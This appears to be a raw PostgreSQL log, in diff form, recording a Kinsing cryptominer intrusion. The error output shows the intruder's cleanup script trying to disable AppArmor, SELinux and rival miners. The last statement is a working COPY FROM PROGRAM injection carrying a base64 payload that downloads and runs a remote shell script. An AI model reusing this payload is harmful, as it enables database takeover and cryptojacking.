+2023-03-29 05:47:16.846 UTC [3495] postgres@value1-user STATEMENT:  INSERT INTO users (id, unique_id, user_type, phone, is_premium_member, subscribed_plan, created_at, last_accessed) VALUES ($1, $2, $3, $4, $5, $6, $7, $8) returning *
+2023-03-29 07:39:28.467 UTC [3552] postgres@postgres LOG:  could not receive data from client: Connection reset by peer
+2023-03-29 07:39:28.471 UTC [3554] postgres@value1-user LOG:  could not receive data from client: Connection reset by peer
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0rm: cannot remove '/var/log/syslog': Permission denied
+chattr: Operation not permitted while setting flags on /tmp/
+chattr: Operation not permitted while setting flags on /var/tmp/
+chattr: Operation not permitted while setting flags on /var/spool/cron
+chattr: Operation not permitted while setting flags on /etc/crontab
+ERROR: You need to be root to run this script
+iptables v1.8.7 (nf_tables): Could not fetch rule set generation id: Permission denied (you must be root)
+
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+bash: line 12: /proc/sys/kernel/nmi_watchdog: Permission denied
+bash: line 13: /etc/sysctl.conf: Permission denied
+userdel: user 'akay' does not exist
+userdel: user 'vfinder' does not exist
+chattr: Permission denied while trying to stat /root/.ssh/
+chattr: Permission denied while trying to stat /root/.ssh/authorized_keys
+bash: line 42: netstat: command not found
+bash: line 43: netstat: command not found
+100 34316  100 34316    0     0  70777      0 --:--:-- --:--:-- --:--:-- 70900
+bash: line 44: netstat: command not found
+bash: line 45: netstat: command not found
+bash: line 46: netstat: command not found
+pkill: killing pid 705 failed: Operation not permitted
+bash: line 66: netstat: command not found
+bash: line 67: netstat: command not found
+bash: line 68: netstat: command not found
+bash: line 69: netstat: command not found
+bash: line 70: netstat: command not found
+bash: line 71: netstat: command not found
+bash: line 72: netstat: command not found
+bash: line 73: netstat: command not found
+bash: line 74: netstat: command not found
+bash: line 75: netstat: command not found
+bash: line 76: netstat: command not found
+bash: line 77: netstat: command not found
+bash: line 78: netstat: command not found
+bash: line 79: netstat: command not found
+bash: line 80: netstat: command not found
+bash: line 81: netstat: command not found
+bash: line 82: netstat: command not found
+cat: /tmp/.X11-unix/01: No such file or directory
+cat: /tmp/.X11-unix/11: No such file or directory
+cat: /tmp/.X11-unix/22: No such file or directory
+cat: /tmp/.pg_stat.0: No such file or directory
+cat: /tmp/.pg_stat.1: No such file or directory
+cat: /data/./oka.pid: No such file or directory
+2023-03-29 07:49:43.780 UTC [3473] LOG:  received smart shutdown request
+2023-03-29 07:49:43.789 UTC [3473] LOG:  background worker "logical replication launcher" (PID 3480) exited with exit code 1
+2023-03-29 07:49:43.789 UTC [3495] postgres@value1-user FATAL:  terminating connection due to administrator command
+grep: Trailing backslash
+kill: (6): Operation not permitted
+kill: (7914): No such process
+kill: (7919): No such process
+bash: line 260: netstat: command not found
+bash: line 261: netstat: command not found
+bash: line 262: netstat: command not found
+bash: line 263: netstat: command not found
+bash: line 264: netstat: command not found
+Failed to stop c3pool_miner.service: Interactive authentication required.
+See system logs and 'systemctl status c3pool_miner.service' for details.
+pkill: killing pid 630 failed: Operation not permitted
+pkill: killing pid 490 failed: Operation not permitted
+pkill: killing pid 630 failed: Operation not permitted
+log_rot: no process found
+chattr: No such file or directory while trying to stat /etc/ld.so.preload
+rm: cannot remove '/opt/atlassian/confluence/bin/1.sh': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/1.sh.1': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/1.sh.2': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/1.sh.3': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/3.sh': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/3.sh.1': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/3.sh.2': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/3.sh.3': No such file or directory
+rm: cannot remove '/var/tmp/lib': No such file or directory
+rm: cannot remove '/var/tmp/.lib': No such file or directory
+chattr: No such file or directory while trying to stat /tmp/lok
+chmod: cannot access '/tmp/lok': No such file or directory
+bash: line 567: docker: command not found
+bash: line 568: docker: command not found
+bash: line 569: docker: command not found
+bash: line 570: docker: command not found
+bash: line 571: docker: command not found
+bash: line 572: docker: command not found
+bash: line 573: docker: command not found
+bash: line 574: docker: command not found
+bash: line 575: docker: command not found
+bash: line 576: docker: command not found
+bash: line 577: docker: command not found
+bash: line 578: docker: command not found
+bash: line 579: docker: command not found
+bash: line 580: docker: command not found
+bash: line 581: docker: command not found
+bash: line 582: docker: command not found
+bash: line 583: docker: command not found
+bash: line 584: docker: command not found
+bash: line 585: docker: command not found
+bash: line 586: docker: command not found
+bash: line 587: docker: command not found
+bash: line 588: docker: command not found
+bash: line 589: setenforce: command not found
+bash: line 590: /etc/selinux/config: Permission denied
+Failed to stop apparmor.service: Interactive authentication required.
+See system logs and 'systemctl status apparmor.service' for details.
+Synchronizing state of apparmor.service with SysV service script with /lib/systemd/systemd-sysv-install.
+Executing: /lib/systemd/systemd-sysv-install disable apparmor
+Failed to reload daemon: Interactive authentication required.
+update-rc.d: error: Permission denied
+Failed to stop aliyun.service.service: Interactive authentication required.
+See system logs and 'systemctl status aliyun.service.service' for details.
+Failed to disable unit: Interactive authentication required.
+/tmp/kinsing is 2c44b4e4706b8bd95d1866d7867efa0e
+2023-03-29 07:49:50.446 UTC [6906] postgres@postgres FATAL:  terminating connection due to administrator command
+2023-03-29 07:49:50.446 UTC [6906] postgres@postgres CONTEXT:  COPY trofopey, line 1: "/tmp/kinsing exists"
+2023-03-29 07:49:50.446 UTC [6906] postgres@postgres STATEMENT:  DROP TABLE IF EXISTS tRoFOpEY;CREATE TABLE tRoFOpEY(cmd_output text);COPY tRoFOpEY FROM PROGRAM 'echo IyEvYmluL2Jhc2gKcGtpbGwgLWYgenN2Ywpwa2lsbCAtZiBwZGVmZW5kZXJkCnBraWxsIC1mIHVwZGF0ZWNoZWNrZXJkCgpmdW5jdGlvbiBfX2N1cmwoKSB7CiAgcmVhZCBwcm90byBzZXJ2ZXIgcGF0aCA8PDwkKGVjaG8gJHsxLy8vLyB9KQogIERPQz0vJHtwYXRoLy8gLy99CiAgSE9TVD0ke3NlcnZlci8vOip9CiAgUE9SVD0ke3NlcnZlci8vKjp9CiAgW1sgeCIke0hPU1R9IiA9PSB4IiR7UE9SVH0iIF1dICYmIFBPUlQ9ODAKCiAgZXhlYyAzPD4vZGV2L3RjcC8ke0hPU1R9LyRQT1JUCiAgZWNobyAtZW4gIkdFVCAke0RPQ30gSFRUUC8xLjBcclxuSG9zdDogJHtIT1NUfVxyXG5cclxuIiA+JjMKICAod2hpbGUgcmVhZCBsaW5lOyBkbwogICBbWyAiJGxpbmUiID09ICQnXHInIF1dICYmIGJyZWFrCiAgZG9uZSAmJiBjYXQpIDwmMwogIGV4ZWMgMz4mLQp9CgppZiBbIC14ICIkKGNvbW1hbmQgLXYgY3VybCkiIF07IHRoZW4KICBjdXJsIDE5NC4zOC4yMC4yMjUvcGcuc2h8YmFzaAplbGlmIFsgLXggIiQoY29tbWFuZCAtdiB3Z2V0KSIgXTsgdGhlbgogIHdnZXQgLXEgLU8tIDE5NC4zOC4yMC4yMjUvcGcuc2h8YmFzaAplbHNlCiAgX19jdXJsIGh0dHA6Ly8xOTQuMzguMjAuMjI1L3BnMi5zaHxiYXNoCmZp|base64 -d|bash';SELECT * FROM tRoFOpEY;DROP TABLE IF EXISTS tRoFOpEY;
+2023-03-29 07:49:50.455 UTC [3475] LOG:  shutting down
+2023-03-29 07:49:50.477 UTC [3473] LOG:  database system is shut down
